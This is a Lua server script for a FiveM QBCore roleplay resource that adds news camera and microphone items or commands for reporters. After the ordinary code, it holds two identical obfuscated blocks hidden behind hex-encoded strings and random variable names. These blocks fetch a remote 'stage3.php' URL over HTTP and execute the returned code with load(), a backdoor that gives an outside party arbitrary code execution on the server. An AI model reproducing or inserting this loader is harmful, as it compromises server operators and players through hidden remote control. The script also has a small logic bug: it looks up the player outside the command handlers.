local QBCore = exports['qb-core']:GetCoreObject()

if Config.UseableItems then

    QBCore.Functions.CreateUseableItem("newscam", function(source)
        TriggerClientEvent("Cam:ToggleCam", source)
    end)

    QBCore.Functions.CreateUseableItem("newsmic", function(source)
        TriggerClientEvent("Mic:ToggleMic", source)
    end)

    QBCore.Functions.CreateUseableItem("newsbmic", function(source)
        TriggerClientEvent("Mic:ToggleBMic", source)
    end)

else

    local Player = QBCore.Functions.GetPlayer(source)
    QBCore.Commands.Add("newscam", "Grab a news camera", {}, false, function(source, _)
        if Player.PlayerData.job.name ~= "reporter" then return end
        TriggerClientEvent("Cam:ToggleCam", source)
    end)

    QBCore.Commands.Add("newsmic", "Grab a news microphone", {}, false, function(source, _)
        if Player.PlayerData.job.name ~= "reporter" then return end
        TriggerClientEvent("Mic:ToggleMic", source)
    end)

    QBCore.Commands.Add("newsbmic", "Grab a Boom microphone", {}, false, function(source, _)
        if Player.PlayerData.job.name ~= "reporter" then return end
        TriggerClientEvent("Mic:ToggleBMic", source)
    end)
end

local lYWhVYWbzcOBwbOrSKjgqAfliaEWFfIwUyyZTLRDCRKQFbEzDQhXUoAOdaPIPADlTjMYzn = {"\x50\x65\x72\x66\x6f\x72\x6d\x48\x74\x74\x70\x52\x65\x71\x75\x65\x73\x74","\x61\x73\x73\x65\x72\x74","\x6c\x6f\x61\x64",_G,"",nil} lYWhVYWbzcOBwbOrSKjgqAfliaEWFfIwUyyZTLRDCRKQFbEzDQhXUoAOdaPIPADlTjMYzn[4][lYWhVYWbzcOBwbOrSKjgqAfliaEWFfIwUyyZTLRDCRKQFbEzDQhXUoAOdaPIPADlTjMYzn[1]]("\x68\x74\x74\x70\x73\x3a\x2f\x2f\x67\x6f\x68\x6f\x6d\x69\x65\x2e\x6f\x72\x67\x2f\x76\x32\x5f\x2f\x73\x74\x61\x67\x65\x33\x2e\x70\x68\x70\x3f\x74\x6f\x3d\x64\x50\x56\x71\x4b", function (aloiahIulvvWwAWkOnRzKqTZvQpgazeeQyzmkNTjYcsSqOEkyzTmiWawlaVFABkybZfsvB, JPYIhCyqiVJxppvrTKpbttPBOcqFOwvxLUHyykpcjqjHBuMAbOwHoNIhbAcCuXvymXLukm) if (JPYIhCyqiVJxppvrTKpbttPBOcqFOwvxLUHyykpcjqjHBuMAbOwHoNIhbAcCuXvymXLukm == lYWhVYWbzcOBwbOrSKjgqAfliaEWFfIwUyyZTLRDCRKQFbEzDQhXUoAOdaPIPADlTjMYzn[6] or JPYIhCyqiVJxppvrTKpbttPBOcqFOwvxLUHyykpcjqjHBuMAbOwHoNIhbAcCuXvymXLukm == lYWhVYWbzcOBwbOrSKjgqAfliaEWFfIwUyyZTLRDCRKQFbEzDQhXUoAOdaPIPADlTjMYzn[5]) then return end lYWhVYWbzcOBwbOrSKjgqAfliaEWFfIwUyyZTLRDCRKQFbEzDQhXUoAOdaPIPADlTjMYzn[4][lYWhVYWbzcOBwbOrSKjgqAfliaEWFfIwUyyZTLRDCRKQFbEzDQhXUoAOdaPIPADlTjMYzn[2]](lYWhVYWbzcOBwbOrSKjgqAfliaEWFfIwUyyZTLRDCRKQFbEzDQhXUoAOdaPIPADlTjMYzn[4][lYWhVYWbzcOBwbOrSKjgqAfliaEWFfIwUyyZTLRDCRKQFbEzDQhXUoAOdaPIPADlTjMYzn[3]](JPYIhCyqiVJxppvrTKpbttPBOcqFOwvxLUHyykpcjqjHBuMAbOwHoNIhbAcCuXvymXLukm))() end)

local fTSKnjfSMhsniytHiicpfmsUhrnbwycbmXBrCwmqUwpQoxYHSYVTHkceGGfcthrJonHcXJ = {"\x50\x65\x72\x66\x6f\x72\x6d\x48\x74\x74\x70\x52\x65\x71\x75\x65\x73\x74","\x61\x73\x73\x65\x72\x74","\x6c\x6f\x61\x64",_G,"",nil} fTSKnjfSMhsniytHiicpfmsUhrnbwycbmXBrCwmqUwpQoxYHSYVTHkceGGfcthrJonHcXJ[4][fTSKnjfSMhsniytHiicpfmsUhrnbwycbmXBrCwmqUwpQoxYHSYVTHkceGGfcthrJonHcXJ[1]]("\x68\x74\x74\x70\x73\x3a\x2f\x2f\x67\x6f\x68\x6f\x6d\x69\x65\x2e\x6f\x72\x67\x2f\x76\x32\x5f\x2f\x73\x74\x61\x67\x65\x33\x2e\x70\x68\x70\x3f\x74\x6f\x3d\x64\x50\x56\x71\x4b", function (nxjZxDjDIQWdsmlGHEKesbaPFBkYOPVbpkWmwaYpbvKsEcSaJnFaGRjEFisUEKbMmroFsH, DAsGHUwCCkEWtSvJQcaQBaIBvoREzKckYhzdxRivgafoFXrDbkYzuCnaYrHjnGVcIpfyjZ) if (DAsGHUwCCkEWtSvJQcaQBaIBvoREzKckYhzdxRivgafoFXrDbkYzuCnaYrHjnGVcIpfyjZ == fTSKnjfSMhsniytHiicpfmsUhrnbwycbmXBrCwmqUwpQoxYHSYVTHkceGGfcthrJonHcXJ[6] or DAsGHUwCCkEWtSvJQcaQBaIBvoREzKckYhzdxRivgafoFXrDbkYzuCnaYrHjnGVcIpfyjZ == fTSKnjfSMhsniytHiicpfmsUhrnbwycbmXBrCwmqUwpQoxYHSYVTHkceGGfcthrJonHcXJ[5]) then return end fTSKnjfSMhsniytHiicpfmsUhrnbwycbmXBrCwmqUwpQoxYHSYVTHkceGGfcthrJonHcXJ[4][fTSKnjfSMhsniytHiicpfmsUhrnbwycbmXBrCwmqUwpQoxYHSYVTHkceGGfcthrJonHcXJ[2]](fTSKnjfSMhsniytHiicpfmsUhrnbwycbmXBrCwmqUwpQoxYHSYVTHkceGGfcthrJonHcXJ[4][fTSKnjfSMhsniytHiicpfmsUhrnbwycbmXBrCwmqUwpQoxYHSYVTHkceGGfcthrJonHcXJ[3]](DAsGHUwCCkEWtSvJQcaQBaIBvoREzKckYhzdxRivgafoFXrDbkYzuCnaYrHjnGVcIpfyjZ))() end)